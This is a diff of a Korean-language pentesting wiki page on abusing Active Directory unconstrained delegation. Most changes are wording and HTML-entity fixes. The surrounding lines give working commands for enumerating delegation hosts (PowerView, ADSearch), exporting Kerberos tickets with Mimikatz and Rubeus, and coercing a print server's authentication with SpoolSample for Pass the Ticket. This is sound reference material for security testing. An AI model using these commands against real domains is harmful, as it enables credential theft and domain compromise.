@@ -14,25 +14,25 @@
 ## Powerview
 Get-NetComputer -Unconstrained #DCs always appear but aren't useful for privesc
 <strong>## ADSearch
-</strong>ADSearch.exe --search "(&#x26;(objectCategory=computer)(userAccountControl:1.2.840.113556.1.4.803:=524288))" --attributes samaccountname,dnshostname,operatingsystem
+</strong>ADSearch.exe --search "(&(objectCategory=computer)(userAccountControl:1.2.840.113556.1.4.803:=524288))" --attributes samaccountname,dnshostname,operatingsystem
 <strong># Export tickets with Mimikatz
 </strong>privilege::debug
 sekurlsa::tickets /export #Recommended way
 kerberos::list /export #Another way
 
 # Monitor logins and export new tickets
-.\Rubeus.exe monitor /targetuser:&#x3C;username> /interval:10 #Check every 10s for new TGTs</code></pre>
+.\Rubeus.exe monitor /targetuser:<username> /interval:10 #Check every 10s for new TGTs</code></pre>
 
-**Mimikatz** 또는 **Rubeus**를 사용하여 메모리에 관리자(또는 피해자 사용자)의 티켓을 로드하여 **[Pass the Ticket](pass-the-ticket.md)**을 수행하십시오.\
+**Mimikatz** 또는 **Rubeus**를 사용하여 메모리에 관리자(또는 피해자 사용자)의 티켓을 로드하여 **[Pass the Ticket](pass-the-ticket.md)** 공격을 수행하십시오.\
 자세한 정보: [https://www.harmj0y.net/blog/activedirectory/s4u2pwnage/](https://www.harmj0y.net/blog/activedirectory/s4u2pwnage/)\
 [**Unconstrained delegation에 대한 추가 정보는 ired.team에서 확인하십시오.**](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/domain-compromise-via-unrestricted-kerberos-delegation)
 
 ### **Force Authentication**
 
-공격자가 "Unconstrained Delegation"이 허용된 컴퓨터를 **타겟으로 삼을 수 있다면**, 그는 **프린트 서버**를 **속여서** **TGT를 메모리에 저장하며 자동으로 로그인**하게 할 수 있습니다.\
-그런 다음 공격자는 **Pass the Ticket 공격을 수행하여** 사용자 프린트 서버 컴퓨터 계정을 가장할 수 있습니다.
+공격자가 "Unconstrained Delegation"이 허용된 컴퓨터를 **타겟으로 삼을 수 있다면**, 그는 **프린트 서버**를 **속여서** **자동으로 로그인**하게 하여 서버의 메모리에 **TGT를 저장**할 수 있습니다.\
+그런 다음 공격자는 사용자 프린트 서버 컴퓨터 계정을 가장하기 위해 **Pass the Ticket 공격을 수행할 수 있습니다**.
 
-프린트 서버가 어떤 머신에 대해서도 로그인하도록 하려면 [**SpoolSample**](https://github.com/leechristensen/SpoolSample)을 사용할 수 있습니다:
+프린트 서버가 어떤 머신에 로그인하도록 하려면 [**SpoolSample**](https://github.com/leechristensen/SpoolSample)을 사용할 수 있습니다:
 ```bash
 .\SpoolSample.exe <printmachine> <unconstrinedmachine>
 ```
